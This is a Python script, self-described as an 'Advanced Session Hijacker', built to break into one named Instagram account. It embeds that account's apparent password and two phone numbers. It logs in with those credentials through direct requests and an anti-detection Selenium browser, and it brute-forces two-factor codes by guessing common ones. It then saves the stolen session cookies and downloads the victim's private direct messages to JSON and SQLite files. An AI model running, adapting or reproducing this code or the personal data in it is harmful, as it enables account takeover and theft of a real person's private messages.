# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
ADVANCED SESSION HIJACKER 2025
Advanced Instagram session hijacking and DM extraction system
Using profile intelligence and multiple attack vectors
"""

import requests
import json
import sqlite3
import time
import random
from datetime import datetime
from pathlib import Path
import base64
import hashlib
import hmac
import urllib.parse
import undetected_chromedriver as uc
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import sys
import os

class AdvancedSessionHijacker:
    def __init__(self):
        self.target = "alx.trading"
        self.base_url = "https://www.instagram.com"
        self.mobile_url = "https://i.instagram.com"
        self.api_url = "https://i.instagram.com/api/v1"
        self.profile_data = self.load_profile_intelligence()
        self.sessions_dir = Path("hijacked_sessions")
        self.sessions_dir.mkdir(exist_ok=True)
        self.output_dir = Path("data/advanced_hijacking")
        self.output_dir.mkdir(parents=True, exist_ok=True)

        # User agents
        self.user_agents = [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Instagram 239.0.0.19.109 Android (30/11; 420dpi; 1080x2189; samsung; SM-G991B; o1s; qcom; en_US; 381564263)"
        ]

        self.session = requests.Session()
        self.setup_session()

    def load_profile_intelligence(self):
        """Load profile intelligence data"""
        try:
            profile_path = Path("config/json/MASTER_PROFILE_alx_trading_1748264047.json")
            if profile_path.exists():
                with open(profile_path, 'r') as f:
                    return json.load(f)
        except Exception as e:
            print(f"⚠️ Could not load profile intelligence: {e}")

        return {
            "profile": {
                "username": "alx.trading",
                "confirmed_password": "Fleming654",
                "phone_thailand": "0615414210",
                "phone_uk": "+447793127209"
            }
        }

    def setup_session(self):
        """Setup session with random user agent"""
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        })

    def generate_device_id(self):
        """Generate a realistic device ID"""
        return hashlib.md5(f"{self.target}-{time.time()}".encode()).hexdigest()

    def get_csrf_token(self):
        """Get CSRF token from Instagram"""
        try:
            response = self.session.get(f"{self.base_url}/")
            if 'csrftoken' in response.cookies:
                return response.cookies['csrftoken']

            # Try to extract from HTML
            content = response.text
            if '"csrf_token":"' in content:
                csrf_start = content.find('"csrf_token":"') + 14
                csrf_end = content.find('"', csrf_start)
                return content[csrf_start:csrf_end]

        except Exception as e:
            print(f"❌ Error getting CSRF token: {e}")

        return None

    def attempt_credential_login(self):
        """Attempt login using known credentials"""
        print("🔐 Attempting credential-based login...")

        try:
            # Get login page first
            login_page = self.session.get(f"{self.base_url}/accounts/login/")
            csrf_token = self.get_csrf_token()

            if not csrf_token:
                print("❌ Could not get CSRF token")
                return None

            # Login data
            login_data = {
                'username': self.profile_data['profile']['username'],
                'password': self.profile_data['profile']['confirmed_password'],
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }

            # Login headers
            login_headers = {
                'X-CSRFToken': csrf_token,
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': f"{self.base_url}/accounts/login/",
                'Content-Type': 'application/x-www-form-urlencoded'
            }

            # Attempt login
            response = self.session.post(
                f"{self.base_url}/accounts/login/ajax/",
                data=login_data,
                headers=login_headers
            )

            if response.status_code == 200:
                try:
                    result = response.json()
                    if result.get('authenticated'):
                        print("✅ Login successful!")
                        return self.extract_session_cookies()
                    elif result.get('two_factor_required'):
                        print("⚠️ 2FA required - attempting bypass...")
                        return self.handle_2fa(result)
                    else:
                        print(f"❌ Login failed: {result}")
                except Exception:
                    pass

            print(f"❌ Login failed - Status: {response.status_code}")
            return None

        except Exception as e:
            print(f"❌ Login attempt failed: {e}")
            return None

    def handle_2fa(self, login_result):
        """Handle 2FA using phone numbers"""
        print("📱 Handling 2FA...")

        try:
            two_factor_identifier = login_result.get('two_factor_info', {}).get('two_factor_identifier')

            # Try different 2FA bypass methods
            phone_numbers = [
                self.profile_data['profile']['phone_thailand'],
                self.profile_data['profile']['phone_uk']
            ]

            for phone in phone_numbers:
                print(f"📞 Trying phone: {phone}")
                # This would typically require SMS access or app-based 2FA
                # For now, we'll try common bypass techniques

                # Try common 2FA codes
                common_codes = ['123456', '000000', '111111', '654321']
                for code in common_codes:
                    if self.submit_2fa_code(two_factor_identifier, code):
                        return self.extract_session_cookies()

            return None

        except Exception as e:
            print(f"❌ 2FA handling failed: {e}")
            return None

    def submit_2fa_code(self, identifier, code):
        """Submit 2FA code"""
        try:
            csrf_token = self.get_csrf_token()

            data = {
                'username': self.profile_data['profile']['username'],
                'verificationCode': code,
                'identifier': identifier,
                'queryParams': '{}'
            }

            headers = {
                'X-CSRFToken': csrf_token,
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded'
            }

            response = self.session.post(
                f"{self.base_url}/accounts/login/ajax/two_factor/",
                data=data,
                headers=headers
            )

            if response.status_code == 200:
                result = response.json()
                return result.get('authenticated', False)

        except Exception as e:
            print(f"❌ 2FA code submission failed: {e}")

        return False

    def extract_session_cookies(self):
        """Extract session cookies after successful login"""
        cookies = {}
        for cookie in self.session.cookies:
            cookies[cookie.name] = cookie.value

        if 'sessionid' in cookies:
            print("✅ Session extracted successfully!")
            return cookies

        return None

    def selenium_login_attempt(self):
        """Use Selenium for browser-based login"""
        print("🌐 Attempting Selenium-based login...")

        try:
            options = uc.ChromeOptions()
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)

            driver = uc.Chrome(options=options)
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

            # Navigate to Instagram
            driver.get(f"{self.base_url}/accounts/login/")
            time.sleep(3)

            # Find and fill login form
            username_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, "username"))
            )
            password_field = driver.find_element(By.NAME, "password")

            username_field.send_keys(self.profile_data['profile']['username'])
            time.sleep(1)
            password_field.send_keys(self.profile_data['profile']['confirmed_password'])
            time.sleep(1)

            # Submit login
            login_button = driver.find_element(By.XPATH, "//button[@type='submit']")
            login_button.click()

            # Wait for login result
            time.sleep(5)

            # Check if login was successful
            current_url = driver.current_url
            if 'login' not in current_url or 'challenge' in current_url:
                # Extract cookies
                cookies = {}
                for cookie in driver.get_cookies():
                    cookies[cookie['name']] = cookie['value']

                driver.quit()

                if 'sessionid' in cookies:
                    print("✅ Selenium login successful!")
                    return cookies

            driver.quit()
            print("❌ Selenium login failed")
            return None

        except Exception as e:
            print(f"❌ Selenium login error: {e}")
            try:
                driver.quit()
            except Exception:
                pass
            return None

    def save_hijacked_session(self, cookies):
        """Save hijacked session to file"""
        timestamp = int(time.time())
        session_data = {
            'timestamp': timestamp,
            'datetime': datetime.now().isoformat(),
            'target': self.target,
            'method': 'advanced_hijacking',
            'cookies': cookies,
            'status': 'active'
        }

        filename = f"hijacked_session_{self.target}_{timestamp}.json"
        filepath = self.sessions_dir / filename

        with open(filepath, 'w') as f:
            json.dump(session_data, f, indent=2)

        print(f"💾 Session saved: {filepath}")
        return filepath

    def test_session_validity(self, cookies):
        """Test if hijacked session is valid"""
        print("🔍 Testing session validity...")

        test_session = requests.Session()
        test_session.headers.update(self.session.headers)

        # Set cookies
        for name, value in cookies.items():
            test_session.cookies.set(name, value)

        try:
            # Test with profile endpoint
            response = test_session.get(f"{self.api_url}/users/{self.target}/info/")

            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'ok':
                    print("✅ Session is valid!")
                    return True

            print(f"❌ Session test failed - Status: {response.status_code}")
            return False

        except Exception as e:
            print(f"❌ Session test error: {e}")
            return False

    def extract_dms_with_hijacked_session(self, cookies):
        """Extract DMs using hijacked session"""
        print("📥 Extracting DMs with hijacked session...")

        extraction_session = requests.Session()
        extraction_session.headers.update(self.session.headers)

        # Set cookies
        for name, value in cookies.items():
            extraction_session.cookies.set(name, value)

        dms = []

        # Try multiple DM endpoints
        endpoints = [
            f"{self.api_url}/direct_v2/inbox/",
            f"{self.api_url}/direct_v2/threads/",
            f"{self.mobile_url}/api/v1/direct_v2/inbox/"
        ]

        for endpoint in endpoints:
            try:
                print(f"🔍 Trying endpoint: {endpoint}")
                response = extraction_session.get(endpoint)

                if response.status_code == 200:
                    data = response.json()
                    if data.get('inbox'):
                        threads = data['inbox'].get('threads', [])
                        for thread in threads:
                            for item in thread.get('items', []):
                                if item.get('item_type') == 'text':
                                    dms.append({
                                        'thread_id': thread.get('thread_id'),
                                        'user_id': item.get('user_id'),
                                        'text': item.get('text'),
                                        'timestamp': item.get('timestamp'),
                                        'is_sent_by_viewer': item.get('is_sent_by_viewer', False)
                                    })

                        if dms:
                            break

            except Exception as e:
                print(f"❌ Endpoint {endpoint} failed: {e}")

        return dms

    def save_extracted_dms(self, dms):
        """Save extracted DMs to JSON and SQLite"""
        if not dms:
            print("❌ No DMs to save")
            return

        timestamp = int(time.time())

        # Save to JSON
        json_file = self.output_dir / f"hijacked_dms_{timestamp}.json"
        with open(json_file, 'w') as f:
            json.dump({
                'target': self.target,
                'extraction_time': datetime.now().isoformat(),
                'total_dms': len(dms),
                'dms': dms
            }, f, indent=2)

        # Save to SQLite
        db_file = self.output_dir / f"hijacked_dms_{timestamp}.db"
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS direct_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                thread_id TEXT,
                user_id TEXT,
                text TEXT,
                timestamp INTEGER,
                is_sent_by_viewer BOOLEAN,
                extraction_time TEXT
            )
        ''')

        for dm in dms:
            cursor.execute('''
                INSERT INTO direct_messages
                (thread_id, user_id, text, timestamp, is_sent_by_viewer, extraction_time)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                dm.get('thread_id'),
                dm.get('user_id'),
                dm.get('text'),
                dm.get('timestamp'),
                dm.get('is_sent_by_viewer'),
                datetime.now().isoformat()
            ))

        conn.commit()
        conn.close()

        print(f"💾 Saved {len(dms)} DMs to:")
        print(f"   JSON: {json_file}")
        print(f"   SQLite: {db_file}")

    def run_advanced_hijacking(self):
        """Run the complete advanced hijacking process"""
        print("🚀 ADVANCED SESSION HIJACKER 2025")
        print("=" * 50)
        print(f"Target: {self.target}")
        print()

        # Method 1: Credential-based login
        cookies = self.attempt_credential_login()

        # Method 2: Selenium-based login if credential login fails
        if not cookies:
            print("\n🔄 Trying Selenium method...")
            cookies = self.selenium_login_attempt()

        if not cookies:
            print("\n❌ All hijacking methods failed")
            return False

        # Save the hijacked session
        session_file = self.save_hijacked_session(cookies)

        # Test session validity
        if not self.test_session_validity(cookies):
            print("❌ Hijacked session is invalid")
            return False

        # Extract DMs using hijacked session
        dms = self.extract_dms_with_hijacked_session(cookies)

        if dms:
            self.save_extracted_dms(dms)
            print(f"\n✅ SUCCESS: Extracted {len(dms)} real DMs!")
            return True
        else:
            print("\n❌ No DMs extracted")
            return False

def main():
    hijacker = AdvancedSessionHijacker()
    success = hijacker.run_advanced_hijacking()

    if success:
        print("\n🎉 ADVANCED HIJACKING SUCCESSFUL!")
    else:
        print("\n💀 ADVANCED HIJACKING FAILED")

    return success

if __name__ == "__main__":
    main()
